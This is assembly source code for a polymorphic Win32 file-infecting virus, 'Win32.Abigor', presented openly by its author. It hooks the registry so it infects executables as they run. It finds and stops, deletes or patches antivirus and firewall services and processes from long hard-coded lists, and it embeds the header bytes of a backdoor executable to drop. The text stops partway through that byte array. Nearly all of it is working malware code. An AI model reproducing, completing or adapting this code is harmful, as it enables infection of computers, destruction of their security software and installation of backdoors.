;                               ********************
;                               *   Win32.Abigor   *
;                               ********************
;
; It is a polymorphic PE file appending win32 virus that uses EPO.
; It is also my first virus attempt.
;
; here is some of it's feature :
; 
;* Infect filez on execution (via registry hooking), and directly the system and windows folder
;  (1st execution only)
;* Patch all occurence of ExitProcess, exit and _exit so the virus runs when the hosts terminates 
;
;* After some time, it will disable AVz and firewall by patching their entry point with a "ret",
;  deleting their service. Then it drops it's backdoor component.
;
;* Randomly trashes the system by blocking exe'z execution, this has 1/1000 chances to happen 
;  when an exe is executed and it is during "generaly" until the system reboots.
;  .
;  .
;  .
;  (well it's not a feature, it's a bug ! :D)
;  
;
;
;
;   
;
;
;
; Well... no more talking here's the code ->

      .586
      .model flat, stdcall
      option casemap :none   ; case sensitive
      

      include \masm32\include\windows.inc
      include \masm32\include\kernel32.inc
      includelib \masm32\lib\kernel32.lib

__DBG_ON__               equ  FALSE           ; TRUE : disable anti-debugging feature FALSE : enable anti-debugging feature
__RELEASE_MODE__    equ  TRUE       ; FALSE : does not infect windows and system TRUE : does infect win & sys dir

%out
%out Virus Version INFO:
%out
IF  __DBG_ON__
            
    %out    * Anti-debugging feature DISABLED
   
ELSE
    %out    * Anti-debugging feature ENABLED
    
ENDIF
    
IF  __RELEASE_MODE__
 
    %out    * DOES infect windows & system directory on 1st execution 
    %out    * Anti-AV routines ENABLED
ELSE
  
    %out    * DOES NOT infect windows & system directory on 1st execution
    %out    * Anti-AV routines DISABLED 
   
ENDIF

%out

.data


templ db "%lx",0                ; DEBUG 1st gen

db 0


.data?
buf db 256 dup (?)              ; DEBUG 1st gen

.code

  ALIGN 4  
    start:
    xor ebx , ebx
jmp VirusStart
hehe:invokE ExitProcess,0                ; 1st gen.
VirusStart:




     rept 8
     nop
     ENDM
     cld

     
     Call ___Delta
 ___Delta:
     pop ebp
     sub ebp, OFFSET ___Delta

     
 

     and      dword ptr [ebp + Patched?],0          ; init error
     
assume fs:nothing

     mov     dword ptr [ebp + @@Delta],ebp          ; Delta to restore if General error
     mov     dword ptr [ebp + @@@Delta],ebp         ; Delta to restore if Kernel base access error
 
     
     lea     eax,[exception_handler+ebp]
     push    eax        
      
     xor     edx,edx                         
     push    dword ptr fs:[edx]            
     mov     dword ptr fs:[edx],esp





    mov  esi, dword ptr [ebp + _KERNEL32]   ; try with last used kernel
    Call GetK32                 
    or   eax,eax  
    jnz  @F  
    
    mov  esi,0BFF70000h         ; Win9x
    Call GetK32                 ; ...
    or   eax,eax
    jnz  @F      
    mov  esi,077E40000h         ; XP
    Call GetK32                 ; GetKernel
    or   eax,eax  
    jnz  @F  

    mov  esi,077E00000h         ; NT/W2k
    Call GetK32
    or   eax,eax
    jnz  @F
    mov  esi,077E80000h         ; NT/W2k
    Call GetK32
    or   eax,eax  
    jnz  @F
    mov  esi,077ED0000h         ; NT/W2k
    Call GetK32
    or   eax,eax  
    jnz  @F
    mov  esi,077F00000h         ; NT/W2k
    Call GetK32
    
    
    @@:
    
    mov  dword ptr [ebp+_KERNEL32],eax          ; Save kernel base
    
    Call GetGetProcAddressAddress               ; hum...
    
    IFE      __DBG_ON__          ; enable debugging for test only

    mov    eax, dword ptr [ebp + _GetProcAddress]
    cmp    byte ptr [eax], 0CCh
    jz     ZeroShit
      
    lea    eax, dword ptr [ebp + szIsDebuggerPresent]
    push   eax
    push   dword ptr [ebp+_KERNEL32]
    Call   dword ptr [ebp + _GetProcAddress]

   
    .IF    eax ==  0                            ; -> win95
           mov     ecx,fs:[20h]
           jecxz   @F
           jmp     ZeroShit                     ; quit if debugger found
          @@:     
    .ELSE                                       ; -> win98, NT, 2k, XP
          CAll  EAX
          or    eax, eax
          jz    @F
          jmp     ZeroShit                      ; quit if debugger found
         @@:
    .ENDIF
    
    ENDIF

   push   3
   lea    eax, dword ptr [ebp + szSetErrorMode]
   Call   K32Api

   lea     eax,[EnableHostExecutionOnError_handlder+ebp]                ; Setup SEH frame for poly error handling
   push    eax        
   mov     dword ptr [ebp + EnableHostExecutionOnError_Delta],ebp       ; Save Delta 
   mov     dword ptr [ebp + EnableHostExecutionOnError_Stack],esp      ; Save Stack
   xor     edx,edx                         
   push    dword ptr fs:[edx]            
   mov     dword ptr fs:[edx],esp
   
    sub    esp, SIZEOF OSVERSIONINFO
    mov    ebx, esp
    assume ebx : ptr OSVERSIONINFO
    mov    dword ptr [ebx].dwOSVersionInfoSize,  SIZEOF OSVERSIONINFO
    push   ebx
    lea    eax, dword ptr [ebp + szGetVersionExA]
    Call   K32Api
    push   dword ptr [ebx].dwPlatformId
    pop    dword ptr [ebp + WinVer]
    add    esp, SIZEOF OSVERSIONINFO

    assume ebx : NOTHING
      
    lea    eax, dword ptr [ebp + Advapi32]
    push   eax
    lea    eax, dword ptr [ebp + szLoadLibraryA]
    Call   K32Api
    mov    dword ptr [ebp + _ADVAPI32], eax

    lea    eax, dword ptr [ebp + Psapi]
    push   eax
    lea    eax, dword ptr [ebp + szLoadLibraryA]
    Call   K32Api
    mov    dword ptr [ebp + _PSAPI], eax
    
    lea    eax, dword ptr [ebp + SFC]
    push   eax
    lea    eax, dword ptr [ebp + szLoadLibraryA]
    Call   K32Api
    mov    dword ptr [ebp + hSFC], eax
    
    lea    eax,dword ptr [ebp + USER32]
    push   eax
    lea    eax,dword ptr [ebp+szLoadLibraryA]   
    Call   K32Api
    mov    dword ptr [ebp+_USER32],eax          ; Save user32 base

    lea    eax,dword ptr [ebp + Shell32]
    push   eax
    lea    eax,dword ptr [ebp+szLoadLibraryA]   
    Call   K32Api
    mov    dword ptr [ebp+_Shell32],eax          ; Save user32 base
    

   
   
    Call   Random_init                          ; init rng seeds


    ;CALL   SetupRegHook                         ; install virus
    
    IF      __RELEASE_MODE__
            
            sub    esp, 120
            mov    ebx, esp
            mov    dword ptr [ebp + CompNameSize], 100
            lea    eax, dword ptr [ebp + CompNameSize]
            push   eax
            push   ebx
            ;lea    eax, dword ptr [ebp + szGetComputerNameA]    ; ERR_NOACCESS ???
            ;Call   K32Api
            lea    eax, dword ptr [ebp + szGetUserNameA]
            Call   ADVAPI32Api
            lea    edi, dword ptr [ebp + OldCompName]
            mov    esi, ebx
            mov    eax, ebx
            call   _strlen
            mov    ecx, eax
            mov    edx, ecx
            repz   cmpsb
            and    byte ptr [ebp + NewSystem],0
            test   ecx, ecx
            jz     CmpInfTime               ; not a new system: abort massive infection
            
            ;####################### executed ONLY once on 1st infection #####################
            
            mov    esi, ebx
            lea    edi, dword ptr [ebp + OldCompName]               ; store old computer name for further checking
            xchg   ecx, edx
            rep    movsb


            lea    eax, dword ptr [ebp + InfectionTime]             ; retrieve 1st infection time on this computer
            push   eax
            lea    eax, dword ptr [ebp + szGetSystemTimeAsFileTime]
            Call   K32Api
            
           lea     eax,[win_infect_handlder+ebp]                ; Setup SEH frame for poly error handling
           push    eax        
           mov     dword ptr [ebp + win_infectDelta],ebp       ; Save Delta 
           mov     dword ptr [ebp + win_infectStack],esp      ; Save Stack
           xor     edx,edx                         
           push    dword ptr fs:[edx]            
           mov     dword ptr fs:[edx],esp

           inc    byte ptr [ebp + NewSystem]

            xor    esi, esi
            lea    eax, dword ptr [ebp + NAV_Win]
            push   eax
            push   esi
            lea    eax, dword ptr [ebp + szFindWindowA]
            Call   U32Api
            mov    dword ptr [ebp + hNAVWnd], eax
            or     eax, eax
            jz     @F
            
            push   esi
            push   9c42h                                ; Desactivate NAV
            push   WM_COMMAND
            push   eax
            lea    eax, dword ptr [ebp + szSendMessageA]
            Call   U32Api
           @@:

            
            Call   infect_newsystem                                 ; ensure perenniality on new system & sleep for some day

        
            mov    ecx, dword ptr [ebp + hNAVWnd]
            jecxz  @F
            
            push   0
            push   9c42h                                ; Restore NAV
            push   WM_COMMAND
            push   ecx
            lea    eax, dword ptr [ebp + szSendMessageA]
            Call   U32Api
           @@:


           win_infect_handlder:
               DB      0BCh
            win_infectStack   dd      00000000h                 ; Restore Stack
            
              xor     edx,edx    
              pop     dword ptr fs:[edx] 
              
        
              db      0BDh
            win_infectDelta dd 00000000h                         ; Restore Delta

            
            ;#################################################################################
           CmpInfTime:
            add    esp, 120

            cmp    byte ptr [ebp + NewSystem],0
            jnz    no_drop
            
            lea    eax, dword ptr [ebp + CreationTime]              ; retrieve current time
            push   eax
            lea    eax, dword ptr [ebp + szGetSystemTimeAsFileTime]
            Call   K32Api

            mov    eax, dword ptr [ebp + InfectionTime].dwLowDateTime
            sub    eax, dword ptr [ebp + CreationTime].dwLowDateTime             ; substract current time
            ;mov    dword ptr [ebp + TimeDifference].dwLowDateTime, eax


            mov    eax, dword ptr [ebp + InfectionTime].dwHighDateTime
            sbb    eax, dword ptr [ebp + CreationTime].dwHighDateTime             ; substract current time
            mov    dword ptr [ebp + TimeDifference].dwHighDateTime, eax

            cmp     eax, TIME_DROP
            ja      no_drop
            


            
            CAll    KillAVz                                         ; après que TIME_DROP soit dépassé detruire les AVs
            
            lea     eax, dword ptr [ebp + TS_Win]
            push    eax
            push    eax
            lea     eax, dword ptr [ebp + szFindWindowA]
            Call    U32Api
            or      eax, eax
            jnz     no_drop                                         ; Backdoor déjà implanté sur notre système ?

            
            Call    Drop_BackDoor                                   ; non ??? implantons !!
            
           no_drop:
    ENDIF
    

   

   EnableHostExecutionOnError_handlder:
       DB      0BCh
    EnableHostExecutionOnError_Stack   dd      00000000h                 ; Restore Stack
    
      xor     edx,edx    
      pop     dword ptr fs:[edx] 

    db      0BDh
    EnableHostExecutionOnError_Delta dd 00000000h                         ; Restore Delta  
            
    
    CALL   SetupRegHook                         ; install virus
    lea    eax, dword ptr [ebp + szGetCommandLineA]
    Call   K32Api
    
    or     byte ptr [eax],20h
    cmp    byte ptr [eax],41h + 32
    jb     Return2host
    cmp    byte ptr [eax],5Ah + 32
    ja     Return2host

    

    sub    esp, 600
    
    
    mov    edi, eax
    
    Call   _strlen
    mov    ecx, eax
 
    mov     al,'"'
    repnz   scasb

       
    mov    dword ptr [ebp + pFileName], edi

    mov     al,'"'
    repnz   scasb
    
    
    .IF    byte ptr [edi] == ' '                    ; in case of cmdline...
    
           and     byte ptr [edi-1],0
           mov     eax, dword ptr [ebp + pFileName]
           Call    _strlen
           mov     ecx, eax
           mov     al,' '
           repnz   scasb
           and     byte ptr [edi-1],0
           
    .ELSE
           and    dword ptr [edi-1],0
    .ENDIF
    
    ;push    edi

    sub     esp, 380
    mov     esi, esp


    push    esi
    mov     byte ptr [esi],' '
    
    inc     esi


   @@:
    mov     al, byte ptr [edi]
    mov     byte ptr [esi], al
    inc     edi
    inc     esi
    or      al,al
    jz      @F
    jmp     @B
   @@:

    pop esi


    mov    eax, dword ptr [ebp + pFileName]
    
    IF      __RELEASE_MODE__
    
      pushad
      

      cmp    byte ptr [ebp + NewSystem],0
      jnz    SkipKill
      xor    edx, edx                                         ; process is not active
      mov    eax, dword ptr [ebp + pFileName]
      cmp    dword ptr [ebp + TimeDifference].dwHighDateTime, TIME_DROP       ; Time to engage kill routines ?
      ja     SkipKill
          ;pushad
          ;push 0 
          ;push eax
          ;push eax
          ;push 0
          ;lea eax, [ebp + szMessageBoxA]
          ;call U32Api
          ;popad
      Call   KillAV                                           ; Check if the file we are trying to run is an AV & if so kill it...
     SkipKill:
      popad

    ENDIF

    pushad
    Call   IsFileAV?
    dec    eax
    popad
    jz      @F                                  ; IS it an AV file ?
    Call    infect                              ; infect !!!
   @@:
    
    sub     esp, (SIZEOF STARTUPINFO + 30)
    mov     ebx, esp
    pushad
    mov    edi, ebx
    mov    ecx, (SIZEOF STARTUPINFO + 30)
    xor    al, al
    rep    stosb
    popad
    push   ebx
    lea    eax, dword ptr [ebp + szGetStartupInfoA]
    Call   K32Api

    ;---
    sub     esp, 280
    mov     ecx, esp 

    push   ecx                  ; for lstricmp
    
    push   0FFh
    push   ecx
    push   0
    lea    eax, dword ptr [ebp + szGetModuleFileNameA]
    Call   K32Api


    push   dword ptr [ebp + pFileName]
    lea    eax, dword ptr [ebp + szlstrcmpiA]
    Call   K32Api
    sub     esp, -280
    
    sub    esp, (SIZEOF PROCESS_INFORMATION + 30)
    mov    edx, esp
    pushad
    mov    edi, edx
    mov    ecx, (SIZEOF PROCESS_INFORMATION + 30)
    xor    al, al
    rep    stosb
    popad
    or     eax, eax
    jz     skpexec



    sub    esp, 280
    mov    edi, esp
    push   esi
    mov    esi, dword ptr [ebp + pFileName]
    mov    eax, esi
    call   _strlen
    mov    ecx, eax
    rep    movsb
    pop    esi

   @@:
    dec    edi
    cmp    byte ptr [edi], '\'
    jnz    @B
    and    byte ptr [edi], 0
    mov    ecx, esp            ;   ecx = repertoire de l'exe


    
    push   edx
    
    xor    eax,eax
    push   edx
    push   ebx
    push   ecx
    push   eax
    push   NORMAL_PRIORITY_CLASS
    push   eax
    push   eax
    push   eax
    pushad
    lea    eax, dword ptr [ebp + szSHGetFileInfo]
    push   eax
    push   dword ptr [ebp + _Shell32]
    Call   dword ptr [ebp + _GetProcAddress]
    mov    ebx, eax

    sub    esp, (SIZEOF SHFILEINFO + 80)
    mov    edi, esp
    
    push   SHGFI_EXETYPE
    push   SIZEOF SHFILEINFO
    push   edi
    push   0
    push   dword ptr [ebp + pFileName]
    Call   ebx                                  ; Get exe file type
    add    esp, (SIZEOF SHFILEINFO + 80)

    clc
    .IF    ax != 'EP'
           stc                                  ; Non-PE file, set carry on
    .ENDIF
    popad
    .IF    CARRY?
           push   eax                           ; Non-PE file, don't use commandline
    .ELSE
           push   esi                           ; PE file, preserve commandline
    .ENDIF
    push   dword ptr [ebp + pFileName]
    lea    eax, dword ptr [ebp + szCreateProcessA]
    Call   K32Api

    pop    ebx
       
    push   [ebx+4]
    lea    eax, dword ptr [ebp + szCloseHandle]
    Call   K32Api 
    

   skpexec:
    add    esp, (600 + 380 + 280 + SIZEOF STARTUPINFO + SIZEOF PROCESS_INFORMATION + 60 ) ; Fix stack

Return2host:



  FreeLib:
  

    push   dword ptr [ebp + _Shell32]
    lea    eax,dword ptr [ebp+szFreeLibrary]   
    Call   K32Api
    
    push   dword ptr [ebp + _USER32]
    lea    eax,dword ptr [ebp+szFreeLibrary]   
    Call   K32Api

    cmp    dword ptr [ebp + hSFC], 0                ; Was it loaded ?
    jz     @F
    push   dword ptr [ebp + hSFC]
    lea    eax, dword ptr [ebp + szFreeLibrary]
    Call   K32Api         
   @@:


    push   dword ptr [ebp + _ADVAPI32]
    lea    eax, dword ptr [ebp + szFreeLibrary]
    Call   K32Api         

    cmp    dword ptr [ebp + _PSAPI], 0                ; Was it loaded ?
    jz     @F
    push   dword ptr [ebp + _PSAPI]
    lea    eax, dword ptr [ebp + szFreeLibrary]
    Call   K32Api   
   @@:
   
    jmp          ZeroShit    ; Clear shit And return 2 host

      


    BytesNeeded      dd      0
    
    KillAVz         proc

    .IF     dword ptr [ebp + WinVer] == VER_PLATFORM_WIN32_NT

        
        Call   KillHostileDrivers       ; kill Hostile NT services first
        
        sub    esp, 2500
        mov    ebx, esp
        lea    eax, dword ptr [ebp + BytesNeeded]
        push   eax
        push   2400
        push   ebx
        lea    eax, dword ptr [ebp + szEnumProcesses]
        Call   PSAPIApi

        
        mov     esi, ebx
       nextone:
        mov     ecx, dword ptr [esi]
        jecxz   Skipit

        push    ecx
        push    0
        push    PROCESS_ALL_ACCESS
        lea     eax, dword ptr [ebp + szOpenProcess]
        Call    K32Api

        or      eax, eax
        jz      Skipit
        
        push    eax             ; <- For CloseHandle


        sub     esp, 300
        mov     edi, esp
        
        push    eax
        
        push    256
        push    edi
        push    0
        push    eax
        lea     eax, dword ptr [ebp + szGetModuleFileNameExA]
        Call    PSAPIApi

        pop     edx
        
        sub     eax, 4
        js      NOgood

        mov     eax, edi
        Call    KillAV
        
        
        mov     ecx, (256 / 4)
        xor     eax, eax
        rep     stosd
        
       NOgood:
        add     esp, 300
        lea     eax, dword ptr [ebp + szCloseHandle]
        Call    K32Api
        
       Skipit:
        add     esi, 4
        mov     eax, ebx
        add     eax, 1024
        cmp     esi, eax
        jle     nextone

        Call   KillHostileDrivers       ; kill Hostile NT services next :)
        
        add    esp, 2500 
                
      .ELSE
      
        push     0
        push     TH32CS_SNAPPROCESS
        lea      eax, dword ptr [ebp + szCreateToolhelp32Snapshot]
        Call     K32Api
        inc      eax
        jz       ErrNoSnapshot
        dec      eax
        mov      esi, eax
  
        sub      esp, SIZEOF PROCESSENTRY32 + 30
        mov      ebx, esp
        assume   ebx : ptr PROCESSENTRY32
        mov      [ebx].dwSize, SIZEOF PROCESSENTRY32
        push     ebx
        push     esi
        lea      eax, dword ptr [ebp + szProcess32First]
        Call     K32Api
       nextone9x:

        push     dword ptr [ebx].th32ProcessID
        push     0
        push     PROCESS_ALL_ACCESS
        lea      eax, dword ptr [ebp + szOpenProcess]
        Call     K32Api
        or       eax, eax
        jz       ErrOpen9x
        lea      edx, dword ptr [ebx].szExeFile
        xchg     eax, edx
        Call     KillAV        
       ErrOpen9x:
        push     ebx
        push     esi
        lea      eax, dword ptr [ebp + szProcess32Next]
        Call     K32Api

        or       eax,eax
        jnz      nextone9x
        
        push     esi
        lea      eax, dword ptr [ebp + szCloseHandle]
        Call     K32Api
        
        add      esp, SIZEOF PROCESSENTRY32 + 30
        assume   ebx : nothing
      ErrNoSnapshot:
    .ENDIF

       ret
       
    KillAVz         endp

services	db	"AMON",0
		db	"avpg",0
		db	"AVPCC",0
		db	"Aavmker",0
		db	"Avast32 Start as Service",0
		db	"AvMon2",0
		db	"AvUpdSvc",0
		db	"KAVMonitorService",0
		db	"NOD32Service",0
		db	"PersFw",0
		db	"vsmon",0
            db    "Vsapint",0
            db    "Tmpreflt",0
            db    "Tmntsrv",0
            db    "Tmfilter",0
            db    "PCCPFW",0
            db    "PCC_PFW",0
            db    "wg3n",0
            db    "SmcService",0
		db	0



    KillHostileDrivers  proc

            xor   esi, esi
            push  SC_MANAGER_ALL_ACCESS
            push  esi
            push  esi
            lea   eax, dword ptr [ebp + szOpenSCManagerA]
            Call  ADVAPI32Api
            mov   ebx, eax
            lea   esi, dword ptr [ebp + services]
           KillServiceLoop:

            push  SERVICE_ALL_ACCESS
            push  esi
            push  ebx
            lea   eax, dword ptr [ebp + szOpenServiceA]
            Call  ADVAPI32Api
            mov   edi, eax
            or    edi, edi
            jz    NextService
            push  ebx
            sub   esp, SIZEOF SERVICE_STATUS + 20
            mov   ebx, esp
            
            push  ebx
            push  SERVICE_CONTROL_STOP
            push  edi
            lea   eax, dword ptr [ebp + szControlService]
            Call  ADVAPI32Api
            
            add   esp, SIZEOF SERVICE_STATUS + 20
            pop   ebx         

            push  edi
            lea   eax, dword ptr [ebp + szDeleteService]
            Call  ADVAPI32Api

            push  edi
            lea   eax, dword ptr [ebp + szCloseServiceHandle]
            Call  ADVAPI32Api
           NextService:
            mov   eax, esi
            call  _strlen
            add   esi, eax
            inc   esi
            cmp   byte ptr [esi],0                            ; No more service ?
            jz    @F                                          ; Exit loop
            jmp   KillServiceLoop                             ; Compare with next service
           @@:        
             
            push  ebx
            lea   eax, dword ptr [ebp + szCloseServiceHandle]
            Call  ADVAPI32Api             
             
            ret
    KillHostileDrivers  endp

     AV_lst db   "Autodown.exe",0
            db   "Tmntsrv.exe",0
            db   "amon.exe",0
            db   "avmaisrv.exe",0
            db   "avserver.exe",0
            db   "nod32.exe",0
            db   "nod32cc.exe",0
            db   "Zonealarm.exe",0
            db   "zapro.exe",0
            db   "Wfindv32.exe",0
            db   "Webscanx.exe",0
            db   "Vsstat.exe",0
            db   "Vshwin32.exe",0
            db   "Vsecomr.exe",0
            db   "Vscan40.exe",0
            db   "Vettray.exe",0
            db   "Vet95.exe",0
            db   "Tds2-Nt.exe",0
            db   "Tds2-98.exe",0
            db   "Tca.exe",0
            db   "Tbscan.exe",0
            db   "Sweep95.exe",0
            db   "Sphinx.exe",0
            db   "Smc.exe",0
            db   "Serv95.exe",0
            db   "Scrscan.exe",0
            db   "Scanpm.exe",0
            db   "Scan95.exe",0
            db   "Scan32.exe",0
            db   "Safeweb.exe",0
            db   "Rescue.exe",0
            db   "Rav7win.exe",0
            db   "Rav7.exe",0
            db   "Persfw.exe",0
            db   "Pcfwallicon.exe",0
            db   "Pccwin98.exe",0
            db   "Pccguide.exe",0
            db   "Pccclient.exe",0
            db   "Pavw.exe",0
            db   "Pavsched.exe",0
            db   "Pavcl.exe",0
            db   "Padmin.exe",0
            db   "Outpost.exe",0
            db   "Nvc95.exe",0
            db   "Nupgrade.exe",0
            db   "Normist.exe",0
            db   "Nmain.exe",0
            db   "Nisum.exe",0
            db   "Navwnt.exe",0
            db   "Navw32.exe",0
            db   "Navnt.exe",0
            db   "Navlu32.exe",0
            db   "Navapw32.exe",0
            db   "N32scanw.exe",0
            db   "Mpftray.exe",0
            db   "Moolive.exe",0
            db   "Luall.exe",0
            db   "Lookout.exe",0
            db   "Lockdown2000.exe",0
            db   "Jedi.exe",0
            db   "Iomon98.exe",0
            db   "Iface.exe",0
            db   "Icsuppnt.exe",0
            db   "Icsupp95.exe",0
            db   "Icmon.exe",0
            db   "Icloadnt.exe",0
            db   "Icload95.exe",0
            db   "Ibmavsp.exe",0
            db   "Ibmasn.exe",0
            db   "Iamserv.exe",0
            db   "Iamapp.exe",0
            db   "Frw.exe",0
            db   "Fprot.exe",0
            db   "Fp-Win.exe",0
            db   "Findviru.exe",0
            db   "F-Stopw.exe",0
            db   "F-Prot95.exe",0
            db   "F-Prot.exe",0
            db   "F-Agnt95.exe",0
            db   "Espwatch.exe",0
            db   "Esafe.exe",0
            db   "Ecengine.exe",0
            db   "Dvp95_0.exe",0
            db   "Dvp95.exe",0
            db   "Cleaner3.exe",0
            db   "Cleaner.exe",0
            db   "Claw95cf.exe",0
            db   "Claw95.exe",0
            db   "Cfinet32.exe",0
            db   "Cfinet.exe",0
            db   "Cfiaudit.exe",0
            db   "Cfiadmin.exe",0
            db   "Blackice.exe",0
            db   "Blackd.exe",0
            db   "Avwupd32.exe",0
            db   "Avwin95.exe",0
            db   "Avsched32.exe",0
            db   "Avpupd.exe",0
            db   "Avptc32.exe",0
            db   "avpm.exe",0
            db   "Avpdos32.exe",0
            db   "Avpcc.exe",0
            db   "Avp32.exe",0
            db   "Avp.exe",0
            db   "Avnt.exe",0
            db   "Avkserv.exe",0
            db   "Avgctrl.exe",0
            db   "Ave32.exe",0
            db   "Avconsol.exe",0
            db   "Apvxdwin.exe",0
            db   "Anti-Trojan.exe",0
            db   "Ackwin32.exe",0
            db   "_Avpm.exe",0
            db   "_Avpcc.exe",0
            db   "_Avp32.exe",0
            db   "Vsmon.exe",0
            db   "Smc.exe",0
            db   0


IsFileAV?   proc    
                ; in : eax = pointer to filename
                ; out : eax == 1 if FileName Is a AV one, else eax == 0

             sub     esp, SIZEOF WIN32_FIND_DATA + 50
           
             mov     edi, esp
             
             push    edi
             assume  edi : ptr WIN32_FIND_DATA
             push    eax
             lea     eax, dword ptr [ebp + szFindFirstFileA]
             Call    K32Api
             lea     edi, [edi].cFileName                         ; Always get the long filename
             assume  edi : nothing
             
             push    eax
             lea     eax, dword ptr [ebp + szFindClose] 
             CAll    K32Api
  
             
   
             cmp     byte ptr [edi+1], ':'
             jnz     JustExe
             
             mov     eax, edi



             Call    _strlen
             add     edi, eax
            @@:
             dec     edi
             cmp     byte ptr [edi], '\'
             jnz     @B
             inc     edi   
             
        JustExe:
            lea     esi, dword ptr [ebp + AV_lst]
        AV_scan_loop:
           
            push    edi
            push    esi
            lea     eax, dword ptr [ebp + szlstrcmpiA]   ; compare it with one AV ?
            Call    K32Api
           
            or      eax, eax                             ; name is matching ?
            jnz     NotListedAV
            
            add     esp, SIZEOF WIN32_FIND_DATA + 50
            
            inc     eax                                  ; AV return 1
            ret

           NotListedAV:
            mov     eax, esi
            Call    _strlen
            add     esi, eax
            inc     esi
            cmp     byte ptr [esi],0                            ; No more AV ?
            jz      @F                                          ; Exit loop
            jmp     AV_scan_loop                                ; Compare with next AV
           @@:
            add     esp, SIZEOF WIN32_FIND_DATA + 50
            xor     eax, eax
            ret
            
IsFileAV?   endp

pid dd 0
 ;test_file db "c:\windows\system32\host.exe",0
            ; in : eax = pointer to filename to process
            ;      edx = process handle IF the process to be trashed is active ELSE put NULL
                   
    KillAV          proc
           pushad
           mov     ebx, eax             ; put pointer to filename into ebx
           mov     dword ptr [ebp + pid], edx
          
           sub     esp, SIZEOF WIN32_FIND_DATA + 50
           mov     edi, esp
           
           push    edi
           assume  edi : ptr WIN32_FIND_DATA
           push    ebx
           lea     eax, dword ptr [ebp + szFindFirstFileA]
           Call    K32Api
           lea     edi, [edi].cFileName                         ; Always get the long filename
           assume  edi : nothing

           push    eax
           lea     eax, dword ptr [ebp + szFindClose] 
           CAll    K32Api

           
 
           cmp     byte ptr [edi+1], ':'
           jnz     JustExe
           
           mov     eax, edi
           Call    _strlen
           add     edi, eax
          @@:
           dec     edi
           cmp     byte ptr [edi], '\'
           jnz     @B
           inc     edi                  ; reach byte after last '\'

        JustExe:
           lea     esi, dword ptr [ebp + AV_lst]

          ;pushad
          ;push 0 
          ;push edi
          ;push ebx
          ;push 0
          ;lea eax, [ebp + szMessageBoxA]
          ;call U32Api
          ;popad
        AV_scan_loop:


      
           push    edi
           push    esi
           lea     eax, dword ptr [ebp + szlstrcmpiA]   ; compare it with one AV ?
           Call    K32Api


           or      eax, eax                             ; name is matching ?
           jnz     NotListedAV


           
           push    dword ptr [edi]
           or      dword ptr [edi], 20202020h
           cmp     dword ptr [edi], 'mpva' ; Avp monitor ?
           pop     dword ptr [edi]
           
           jz      @F               ; don't kill it

           mov     ecx, dword ptr [ebp + pid]
           jecxz   @F               ; is process running ? no skip
           push    eax
           push    ecx
           lea     eax, dword ptr [ebp + szTerminateProcess]    ; kill !
           Call    K32Api
          @@:

          ;pushad
          ;push 0 
          ;push edi
          ;push ebx
          ;push 0
          ;lea eax, [ebp + szMessageBoxA]
          ;call U32Api
          ;popad
           
           Call    PatchAV                                     ; Extra (may only work when prossess
                                                               ; is about to be launched due to
                                                               ; the latency time necessary to unload
                                                               ; image from the memory and, thus, writing
          NotListedAV:                                         ; to the file on disk)
           mov     eax, esi
           Call    _strlen
           add     esi, eax
           inc     esi
           cmp     byte ptr [esi],0                            ; No more AV ?
           jz      @F                                          ; Exit loop
           jmp     AV_scan_loop                                ; Compare with next AV
          @@:
           add     esp, SIZEOF WIN32_FIND_DATA + 50
           popad
           ret
    KillAV          endp

        
    PatchAV         proc uses edx        ; in : ebx = pointer to full path of file to patch.
            pushad
            


            push   FILE_ATTRIBUTE_NORMAL
            push   ebx
            lea    eax, dword ptr [ebp + szSetFileAttributesA]  ; reset attributes
            Call   K32Api

            
            xor    esi, esi
            push   esi
            push   FILE_ATTRIBUTE_NORMAL	
            push   OPEN_EXISTING
            push   esi
            push   FILE_SHARE_READ or FILE_SHARE_WRITE
            push   GENERIC_READ    or    GENERIC_WRITE
            push   ebx
            lea    eax, dword ptr [ebp + szCreateFileA]
            Call   K32Api

            inc   eax
            jz    ErrOpen
		dec 	 eax
            mov    dword ptr [ebp + hFile],eax

                     
            push   esi
            push   esi
            push   esi
            push   PAGE_READWRITE	
            push   esi
            push   dword ptr [ebp + hFile]
            lea    eax,[ebp+szCreateFileMappingA]
            call   K32Api


            
		or 	eax,eax
            jz    ErrCloseFa

            mov    dword ptr [ebp + hMap],eax
            
            push   esi
            push   esi
            push   esi
            push   FILE_MAP_ALL_ACCESS
            push   dword ptr [ebp+hMap]
            lea    eax,dword ptr [ebp+szMapViewOfFile]
            call   K32Api

            test   eax,eax
            jz     ErrShit
            
            mov    dword ptr [ebp + pMap],eax

            cmp    word ptr [eax],IMAGE_DOS_SIGNATURE       
            jnz    ErrShit
            mov    edi,[eax+3ch]
            add    edi,eax
            cmp    dword ptr [edi],IMAGE_NT_SIGNATURE             
            jnz    ErrShit

            assume edi : ptr IMAGE_NT_HEADERS
            
            mov    edi,[edi].OptionalHeader.AddressOfEntryPoint
            mov    esi,dword ptr [ebp + pMap]
            Call   RVAToOffset          ; get raw offset
            add    eax,dword ptr [ebp + pMap] ; add base address
            assume edi : nothing
            mov    edi,eax
            mov    al, 0C3h             ; patch entrypoint with "return to windows"
            stosb
            Call   Random32
            and    eax,07Fh
            Call   GenTrashBlk          ; add shit ... 
                                        ; this should make it a bit harder to repair :-)
           ErrShit:
            Call   UnMap
           ErrCloseFa:
            push   dword ptr [ebp+hFile] 
            lea    eax, dword ptr [ebp + szCloseHandle]
            Call   K32Api
          ErrOpen:
          
           popad
           ret
    PatchAV         endp

    

      
 

 

 

 
  BackdoorStart    db 77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0
  db 184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,176,0,0,0
  db 14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104
  db 105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111
  db 116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32
  db 109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0
  db 85,217,249,219,17,184,151,136,17,184,151,136,17,184,151,136
  db 17,184,151,136,146,184,151,136,237,152,133,136,19,184,151,136
  db 82,105,99,104,17,184,151,136,0,0,0,0,0,0,0,0
  db 80,69,0,0,76,1,3,0,143,87,26,64,0,0,0,0
  db 0,0,0,0,224,0,15,1,11,1,5,12,0,48,0,0
  db 0,16,0,0,0,192,1,0,48,242,1,0,0,208,1,0
  db 0,0,2,0,0,0,64,0,0,16,0,0,0,2,0,0
  db 4,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0
